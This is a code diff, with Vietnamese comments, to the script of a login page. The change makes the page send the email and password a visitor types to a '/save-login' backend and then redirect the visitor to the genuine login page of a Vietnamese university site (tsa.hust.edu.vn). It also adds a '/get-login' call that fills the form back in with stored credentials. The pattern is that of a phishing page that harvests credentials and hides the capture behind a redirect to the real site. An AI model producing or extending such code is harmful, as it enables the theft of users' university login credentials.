@@ -72,23 +72,42 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            // Lưu email và mật khẩu vào localStorage
-            localStorage.setItem("savedEmail", email);
-            localStorage.setItem("savedPassword", password);
-
-            // Chuyển hướng đến trang web chỉ định sau khi lưu thông tin
-            window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Thay đổi URL này thành trang bạn muốn chuyển hướng đến
+            // Gửi thông tin đăng nhập đến backend để lưu
+            fetch('/save-login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+                // Chuyển hướng đến trang web chỉ định sau khi lưu thông tin
+                window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Thay đổi URL này thành trang bạn muốn chuyển hướng đến
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
         });
 
         // Kiểm tra nếu có thông tin đăng nhập đã lưu và điền vào form
         window.onload = function() {
-            const savedEmail = localStorage.getItem("savedEmail");
-            const savedPassword = localStorage.getItem("savedPassword");
-
-            if (savedEmail && savedPassword) {
-                document.getElementById("email").value = savedEmail;
-                document.getElementById("password").value = savedPassword;
-            }
+            fetch('/get-login')
+                .then(response => {
+                    if (response.status === 200) {
+                        return response.json();
+                    } else {
+                        throw new Error('No saved login information');
+                    }
+                })
+                .then(data => {
+                    document.getElementById("email").value = data.email;
+                    document.getElementById("password").value = data.password;
+                })
+                .catch(error => {
+                    console.log(error.message);
+                });
         };
     </script>
 </body>
